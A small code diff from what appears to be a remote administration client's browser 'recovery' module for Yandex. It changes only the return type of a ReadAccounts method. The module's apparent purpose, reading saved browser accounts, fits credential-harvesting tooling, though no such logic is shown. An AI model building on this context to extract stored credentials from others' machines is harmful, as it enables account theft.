@@ -11,7 +11,7 @@ namespace RemoteAdmin.Client.Recovery.Browsers
         public override string ApplicationName => "Yandex";
 
         /// <inheritdoc />
-        public override IEnumerable<RecoveredAccount> ReadAccounts()
+        public override List<RecoveredAccount> ReadAccounts()
         {
             try
             {
